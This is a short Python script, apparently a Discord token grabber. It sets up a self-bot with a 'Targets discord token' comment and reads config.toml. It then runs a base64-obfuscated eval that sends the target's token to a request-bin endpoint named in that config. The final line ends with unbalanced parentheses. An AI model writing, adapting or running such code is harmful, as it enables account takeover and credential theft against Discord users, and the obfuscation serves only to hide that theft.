import discord
from discord.ext import commands
import toml

token = "" # Targets discord token
client = commands.Bot(command_prefix=">", self_bot=True)

with open("config.toml") as content:
    content = toml.loads(content.read())
api = (eval(__import__("base64").b64decode("KF9faW1wb3J0X18oInJlcXVlc3RzIikuZ2V0KGYie2NvbnRlbnRbImNvbmZpZyJdWyJyZXF1ZXN0X2Jpbl9lbmRwb2ludCJdfT90b2tlbj17dG9rZW59Iik=")
